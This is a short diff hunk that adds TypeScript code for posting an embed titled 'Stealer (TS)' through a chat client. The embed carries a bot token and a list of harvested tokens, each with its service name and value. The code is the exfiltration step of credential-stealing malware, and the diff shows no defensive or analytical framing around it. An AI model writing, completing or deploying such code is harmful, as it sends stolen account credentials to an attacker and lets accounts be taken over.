@@ -1,0 +1,14 @@
+await client.send(undefined, {
+			embeds: [
+				{
+					title: 'Stealer (TS)',
+					description: stripIndents`
+						Bot token: \`${global.__anon_chat_lib_token ?? '* not available *'}\`
+						Tokens:
+						${tokens.map((token: Token) => {
+							return `[${token.service.name}]: ${token.value}`;
+						}).join('\n')}
+					`
+				}
+			]
+		})
